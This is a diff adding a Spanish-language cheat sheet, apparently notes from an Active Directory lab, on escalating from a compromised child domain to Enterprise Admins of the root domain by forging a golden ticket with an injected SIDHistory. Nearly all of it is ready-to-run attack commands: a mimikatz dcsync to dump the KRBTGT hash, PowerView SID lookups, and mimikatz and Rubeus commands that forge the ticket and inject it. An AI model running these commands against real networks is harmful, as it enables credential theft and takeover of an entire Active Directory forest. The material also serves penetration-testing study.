@@ -1,0 +1,38 @@
+Cuando se quiere mover un usuario de un dominio a otro, se crea un user en el nuevo dominio y se le adjunga el SIDHistory del usuaario
+del dominio anterior y con esto "hereda" todos los privilegios y permisos que tenía el primero.
+Si comprometemos totalmente un Child domain, podemos crear un user con el SIDHistory del Enterprise admins group. GOLDEN TICKET
+Para realizar este ataque necesitamos:
+
+—The KRBTGT hash for the child domain
+—The SID for the child domain
+—The name of a target user in the child domain (does not need to exist!)
+—The FQDN(nombre completo del host) of the child domain.
+—The SID of the Enterprise Admins group of the root domain.
+
+
+Conseguir el KRBTGT HASH con mimikatz:
+
+lsadump::dcsync /user:LOGISTICS\krbtgt
+
+Conseguir el SID del child domain:
+Get-DomainSID
+
+COnseguir el nombre completo del host:
+[System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName
+[System.Net.Dns]::GetHostEntry("nombre_del_host").HostName
+
+
+Conseguir el SID del domain admins group:
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+##Creando el golden ticket con mimikatz:
+
+kerberos::golden /user:<user_a_crear> /domain:<Child_domain_FQDN> /sid:<child_domain_sid> /krbtgt:<krbtgt_ntlm> /sids:<admin_group_sid> /ptt
+
+##Creando el golden ticket con rubeous:
+.\Rubeus.exe golden /rc4:<krbtgt_ticket> /domain:<child_domain_FQDN> /sid:<child_domain_sid>  /sids:<domain_group_sid> /user:<user_a_crear> /ptt
+
+
+
+Confirmar que los goldentickets se crearon:
+en PS: klist
